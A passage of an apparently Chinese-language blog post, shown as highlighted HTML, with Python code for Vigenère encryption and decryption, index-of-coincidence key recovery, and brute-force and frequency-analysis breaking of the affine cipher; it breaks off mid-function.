class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chzs</span><span class="params">(input)</span>:</span> <span class="comment">#定义重合指数法</span></span><br><span class="line">    num_list = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        ord_input = ord(input[i])<span class="number">-97</span></span><br><span class="line">        num_list[ord_input] +=<span class="number">1</span></span><br><span class="line">    n = len(input)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        res += num_list[i]*(num_list[i]<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> float(res)/((n)*n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">len_key</span><span class="params">(input)</span>:</span><span class="comment">#计算密钥长度</span></span><br><span class="line">    may_d = <span class="number">0</span></span><br><span class="line">    index_d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        str_list = [<span class="string">""</span>] * d</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">            str_list[i%d] += input[i]</span><br><span class="line">        ch_sum = <span class="number">0</span></span><br><span class="line">        ch_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, len(str_list)):</span><br><span class="line">            <span class="keyword">if</span> str_list[k] !=<span class="string">""</span>:</span><br><span class="line">                ch_sum += chzs(str_list[k])</span><br><span class="line">                ch_time +=<span class="number">1</span></span><br><span class="line">            print(chzs(str_list[k]))</span><br><span class="line">            print(str_list[k])</span><br><span class="line">        print(d)</span><br><span class="line">        k1 = abs(ch_sum / ch_time - <span class="number">0.065</span>)</span><br><span class="line">        k2 = abs(may_d - <span class="number">0.065</span>)</span><br><span class="line">        <span class="keyword">if</span> k1&lt;k2:                       <span class="comment">#取最接近0.065的</span></span><br><span class="line">            may_d = ch_sum / ch_time</span><br><span class="line">            index_d = d</span><br><span class="line"><span class="keyword">return</span> index_d</span><br></pre></td></tr></table></figure><h3 id="重合互指数"><a href="#重合互指数" class="headerlink" title="重合互指数"></a>重合互指数</h3><p>重合互指数用于确定密钥字。</p><p>假定𝑥＝𝑥1𝑥2 … 𝑥𝑛和𝑦＝𝑦1 𝑦2…𝑦𝑛′,分别是长为𝑛和𝑛’的字符串。𝑥和𝑦的重合互指数是指𝑥的一个随机元素等于𝑦的一个随机元素的概率，记为𝑀𝐼𝑐(𝑥,𝑦)</p><p>将𝑥和𝑦中的字母A,B,C,……,Z出现的次数分别表示为𝑓0,𝑓1,……,𝑓25和𝑓0′, 𝑓1′,⋯,𝑓25′, 那么</p><img src="https://s2.ax1x.com/2020/01/03/laeyPs.png" alt="laeyPs.png" style="zoom:50%;"><h3 id="重合互指数算法"><a href="#重合互指数算法" class="headerlink" title="重合互指数算法"></a>重合互指数算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xd_d</span><span class="params">(input)</span>:</span> <span class="comment">#相对位移</span></span><br><span class="line">    <span class="comment">#pi频率表</span></span><br><span class="line">    pi=[<span class="number">0.082</span>,<span class="number">0.015</span>,<span class="number">0.028</span>,<span class="number">0.043</span>,<span class="number">0.127</span>,<span class="number">0.022</span>,<span class="number">0.02</span>,<span class="number">0.061</span>,<span class="number">0.07</span>,<span class="number">0.002</span>,<span class="number">0.008</span>,<span class="number">0.04</span>,<span class="number">0.024</span>,<span class="number">0.067</span>,<span class="number">0.075</span>,<span class="number">0.019</span>,<span class="number">0.001</span>,<span class="number">0.06</span>,<span class="number">0.063</span>,<span class="number">0.091</span>,<span class="number">0.028</span>,<span class="number">0.01</span>,<span class="number">0.023</span>,<span class="number">0.001</span>,<span class="number">0.02</span>,<span class="number">0.001</span>]</span><br><span class="line">    print(pi)</span><br><span class="line">    key_len = len_key(input)</span><br><span class="line">    print(<span class="string">"密钥长度："</span>,key_len)</span><br><span class="line">    d_list = [<span class="number">0</span>]*key_len</span><br><span class="line">    <span class="comment">#weiyi = [0]*key_len</span></span><br><span class="line">    str_list = [<span class="string">""</span>]*key_len<span class="comment">#根据密钥长度分组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        str_list[i%key_len] += input[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,key_len):<span class="comment">#查看分组结果和计算每个分组长度</span></span><br><span class="line">        print(str_list[i],<span class="string">"长度："</span>,len(str_list[i]))</span><br><span class="line">        d_list[i]=len(str_list[i])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,key_len):<span class="comment">#找第i组的相对位移</span></span><br><span class="line">        num_list_i = [<span class="number">0</span>] * <span class="number">26</span><span class="comment">#每个字母出现的次数</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str_list[i]:<span class="comment">#计算i组每个字母出现次数</span></span><br><span class="line">            i_c = ord(k) - <span class="number">97</span></span><br><span class="line">            num_list_i[i_c] += <span class="number">1</span></span><br><span class="line">        may_mc=<span class="number">0</span></span><br><span class="line">        may_d=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):<span class="comment">#位移长度</span></span><br><span class="line">            mc=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):<span class="comment">#计算最接近0.065的互重合指数</span></span><br><span class="line">                mc+=pi[l]*float(num_list_i[(l+j)%<span class="number">26</span>]/d_list[i])</span><br><span class="line">                <span class="keyword">if</span>(abs(mc<span class="number">-0.065</span>)&lt;=abs(may_mc<span class="number">-0.065</span>)):</span><br><span class="line">                    may_mc=mc</span><br><span class="line">                    may_d=j</span><br><span class="line">        print(i,<span class="string">"组："</span>,may_mc,chr(<span class="number">97</span>+may_d))</span><br></pre></td></tr></table></figure><h2 id="代码运行结果"><a href="#代码运行结果" class="headerlink" title="代码运行结果"></a>代码运行结果</h2><p><strong>加密：</strong></p><p><img src="https://s2.ax1x.com/2020/01/03/laeTi9.png" alt="laeTi9.png"></p><p><strong>解密：</strong></p><p><img src="https://s2.ax1x.com/2020/01/03/laeHR1.png" alt="laeHR1.png"></p><p><strong>重合指数：</strong></p><p><img src="https://s2.ax1x.com/2020/01/03/lamPzt.png" alt="lamPzt.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>多表代换密码打破了原语言的字符出现规律，故其分析方法比单表代换密码复杂得多。多表代换密码对比单表代换密码安全性显著提高。但是仍然可以用一些统计分析法破解（具体参看上文攻击方法），但是前提是密文足够长。所以，较短的密文几乎是不可破译的。较长的密文是很容易破解的。</p><h2 id="仿射密码的破解"><a href="#仿射密码的破解" class="headerlink" title="仿射密码的破解"></a>仿射密码的破解</h2><h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>仿射密码属于单表代换密码，它使用线性方程加上一个模数。<br>$$<br>c_i=(k_1*m_i+k_2)mod26<br>$$<br>前提条件是：k1 和 26 互素</p><h3 id="穷举攻击"><a href="#穷举攻击" class="headerlink" title="穷举攻击"></a>穷举攻击</h3><p>通过密文，列举出所有可能的明文（一共 311 种情况），从中找出有特定标识或构成自然语言中有意义的单词或短语的正确明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BruteAffineDecrypt</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k1 <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> gcd(k1,<span class="number">26</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> k2 <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"k1 = "</span>+str(k1).zfill(<span class="number">2</span>)+<span class="string">", k2 = "</span>+str(k2).zfill(<span class="number">2</span>)+<span class="string">": "</span>+AffineDecrypt(c,k1,k2))</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="https://s2.ax1x.com/2020/01/03/lamT0S.png" alt="lamT0S.png"></p><h3 id="频率分析攻击"><a href="#频率分析攻击" class="headerlink" title="频率分析攻击"></a>频率分析攻击</h3><p>统计密文中字母的出现次数和频率，从出现频率最高的几个字母及双字母组合、三字母组合开始，并假定它们是英语中出现频率较高的字母及字母组合对应的密文，逐步推测各密文字母对应的明文字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pinlv</span><span class="params">(input)</span>:</span></span><br><span class="line">    num_list = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        ord_input = ord(input[i])<span class="number">-97</span></span><br><span class="line">        num_list[ord_input] +=<span class="number">1</span></span><br><span class="line">    n = len(input)</span><br><span class="line">    x=[]</span><br><span class="line">    y=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        x.append(chr(<span class="number">97</span>+i))</span><br><span class="line">        y.append(float(num_list[i]/n))</span><br><span class="line">    plt.bar(x, y, <span class="number">0.4</span>, color=<span class="string">"green"</span>)</span><br><span class="line">    plt.xlabel(<span class="string">"Letters"</span>)</span><br><span class="line">    plt.ylabel(<span class="string">"Frequency"</span>)</span><br><span class="line">    plt.title(<span class="string">"Frequency analysis"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lantnf.png" alt="lantnf.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><h3 id="维吉尼亚加解密"><a href="#维吉尼亚加解密" class="headerlink" title="维吉尼亚加解密"></a>维吉尼亚加解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereEncrypt</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    k = k.upper()</span><br><span class="line">    lm = len(m)</span><br><span class="line">    lk = len(k)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lm):</span><br><span class="line">        <span class="keyword">if</span> m[i].isupper():</span><br><span class="line">            ans += chr(((ord(m[i])-ord(<span class="string">'A'</span>))%<span class="number">26</span>+(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'A'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> m[i].islower():</span><br><span class="line">            ans += chr(((ord(m[i])-ord(<span class="string">'a'</span>))%<span class="number">26</span>+(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += m[i]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="comment"># Decryption</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereDecrypt</span><span class="params">(c,k)</span>:</span></span><br><span class="line">    k = k.upper()</span><br><span class="line">    lc = len(c)</span><br><span class="line">    lk = len(k)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lc):</span><br><span class="line">        <span class="keyword">if</span> c[i].isupper():</span><br><span class="line">            ans += chr(((ord(c[i])-ord(<span class="string">'A'</span>))%<span class="number">26</span>+<span class="number">26</span>-(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'A'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c[i].islower():</span><br><span class="line">            ans += chr(((ord(c[i])-ord(<span class="string">'a'</span>))%<span class="number">26</span>+<span class="number">26</span>-(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += c[i]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="comment"># Main function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        op = input(<span class="string">"What do you want to do?\n[E]Encryption [D]Decryption\n"</span>).upper()</span><br><span class="line">        <span class="keyword">if</span> op[<span class="number">0</span>] == <span class="string">"E"</span>:</span><br><span class="line">            s = input(<span class="string">"Please enter your plaintext:\n\t"</span>)</span><br><span class="line">            k = input(<span class="string">"Please enter your key:\n\t"</span>)</span><br><span class="line">            <span class="comment"># s = "plaintext"</span></span><br><span class="line">            <span class="comment"># k = "key"</span></span><br><span class="line">            <span class="keyword">print</span> (<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">            Encryption = VigenereEncrypt(s,k)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"The Ciphertext is:\n\t"</span>+Encryption)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> op[<span class="number">0</span>] == <span class="string">"D"</span>:</span><br><span class="line">            s = input(<span class="string">"Please enter your ciphertext:\n\t"</span>)</span><br><span class="line">            k = input(<span class="string">"Please enter your key:\n\t"</span>)</span><br><span class="line">            <span class="comment"># s = "ciphertext"</span></span><br><span class="line">            <span class="comment"># k = "key"</span></span><br><span class="line">            <span class="keyword">print</span> (<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Decryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">            Decryption = VigenereDecrypt(s,k)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"The Plaintext is:\n\t"</span>+Decryption)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="重合指数"><a href="#重合指数" class="headerlink" title="重合指数"></a>重合指数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chzs</span><span class="params">(input)</span>:</span> <span class="comment">#定义重合指数法</span></span><br><span class="line">    num_list = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        ord_input = ord(input[i])<span class="number">-97</span></span><br><span class="line">        num_list[ord_input] +=<span class="number">1</span></span><br><span class="line">    n = len(input)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        res += num_list[i]*(num_list[i]<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> float(res)/((n)*n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">len_key</span><span class="params">(input)</span>:</span><span class="comment">#计算密钥长度</span></span><br><span class="line">    may_d = <span class="number">0</span></span><br><span class="line">    index_d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        str_list = [<span class="string">""</span>] * d</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">            str_list[i%d] += input[i]</span><br><span class="line">        ch_sum = <span class="number">0</span></span><br><span class="line">        ch_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, len(str_list)):</span><br><span class="line">            <span class="keyword">if</span> str_list[k] !=<span class="string">""</span>:</span><br><span class="line">                ch_sum += chzs(str_list[k])</span><br><span class="line">                ch_time +=<span class="number">1</span></span><br><span class="line">            print(chzs(str_list[k]))</span><br><span class="line">            print(str_list[k])</span><br><span class="line">        print(d)</span><br><span class="line">        k1 = abs(ch_sum / ch_time - <span class="number">0.065</span>)</span><br><span class="line">        k2 = abs(may_d - <span class="number">0.065</span>)</span><br><span class="line">        <span class="keyword">if</span> k1&lt;k2:                       <span class="comment">#取最接近0.065的</span></span><br><span class="line">            may_d = ch_sum / ch_time</span><br><span class="line">            index_d = d</span><br><span class="line">    <span class="keyword">return</span> index_d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xd_d</span><span class="params">(input)</span>:</span> <span class="comment">#相对位移</span></span><br><span class="line">    <span class="comment">#pi频率表</span></span><br><span class="line">    pi=[<span class="number">0.082</span>,<span class="number">0.015</span>,<span class="number">0.028</span>,<span class="number">0.043</span>,<span class="number">0.127</span>,<span class="number">0.022</span>,<span class="number">0.02</span>,<span class="number">0.061</span>,<span class="number">0.07</span>,<span class="number">0.002</span>,<span class="number">0.008</span>,<span class="number">0.04</span>,<span class="number">0.024</span>,<span class="number">0.067</span>,<span class="number">0.075</span>,<span class="number">0.019</span>,<span class="number">0.001</span>,<span class="number">0.06</span>,<span class="number">0.063</span>,<span class="number">0.091</span>,<span class="number">0.028</span>,<span class="number">0.01</span>,<span class="number">0.023</span>,<span class="number">0.001</span>,<span class="number">0.02</span>,<span class="number">0.001</span>]</span><br><span class="line">    print(pi)</span><br><span class="line">    key_len = len_key(input)</span><br><span class="line">    print(<span class="string">"密钥长度："</span>,key_len)</span><br><span class="line">    d_list = [<span class="number">0</span>]*key_len</span><br><span class="line">    <span class="comment">#weiyi = [0]*key_len</span></span><br><span class="line">    str_list = [<span class="string">""</span>]*key_len<span class="comment">#根据密钥长度分组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        str_list[i%key_len] += input[i]</span><br><span class="line">    <span class="comment">#print("****",len(d_list))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,key_len):<span class="comment">#查看分组结果和计算每个分组长度</span></span><br><span class="line">        print(str_list[i],<span class="string">"长度："</span>,len(str_list[i]))</span><br><span class="line">        d_list[i]=len(str_list[i])</span><br><span class="line">    <span class="comment">#sll = len(str_list)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,key_len):<span class="comment">#找第i组的相对位移</span></span><br><span class="line">        num_list_i = [<span class="number">0</span>] * <span class="number">26</span><span class="comment">#每个字母出现的次数</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str_list[i]:<span class="comment">#计算i组每个字母出现次数</span></span><br><span class="line">            i_c = ord(k) - <span class="number">97</span></span><br><span class="line">            num_list_i[i_c] += <span class="number">1</span></span><br><span class="line">        may_mc=<span class="number">0</span></span><br><span class="line">        may_d=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):<span class="comment">#位移长度</span></span><br><span class="line">            mc=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):<span class="comment">#计算最接近0.065的互重合指数</span></span><br><span class="line">                mc+=pi[l]*float(num_list_i[(l+j)%<span class="number">26</span>]/d_list[i])</span><br><span class="line">                <span class="keyword">if</span>(abs(mc<span class="number">-0.065</span>)&lt;=abs(may_mc<span class="number">-0.065</span>)):</span><br><span class="line">                    may_mc=mc</span><br><span class="line">                    may_d=j</span><br><span class="line">            <span class="comment">#print(mc)</span></span><br><span class="line">        print(i,<span class="string">"组："</span>,may_mc,chr(<span class="number">97</span>+may_d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s=input(<span class="string">"Please enter your ciphertext:\n\t"</span>)</span><br><span class="line">    xd_d(s)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="仿射频率分析"><a href="#仿射频率分析" class="headerlink" title="仿射频率分析"></a>仿射频率分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.mlab <span class="keyword">as</span> mlab</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pinlv</span><span class="params">(input)</span>:</span></span><br><span class="line">    num_list = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input)):</span><br><span class="line">        ord_input = ord(input[i])<span class="number">-97</span></span><br><span class="line">        num_list[ord_input] +=<span class="number">1</span></span><br><span class="line">    n = len(input)</span><br><span class="line">    x=[]</span><br><span class="line">    y=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        x.append(chr(<span class="number">97</span>+i))</span><br><span class="line">        y.append(float(num_list[i]/n))</span><br><span class="line">    plt.bar(x, y, <span class="number">0.4</span>, color=<span class="string">"green"</span>)</span><br><span class="line">    plt.xlabel(<span class="string">"Letters"</span>)</span><br><span class="line">    plt.ylabel(<span class="string">"Frequency"</span>)</span><br><span class="line">    plt.title(<span class="string">"Frequency analysis"</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"Please enter your ciphertext:\n\t"</span>)</span><br><span class="line">    pinlv(s)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="仿射暴力破解"><a href="#仿射暴力破解" class="headerlink" title="仿射暴力破解"></a>仿射暴力破解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> 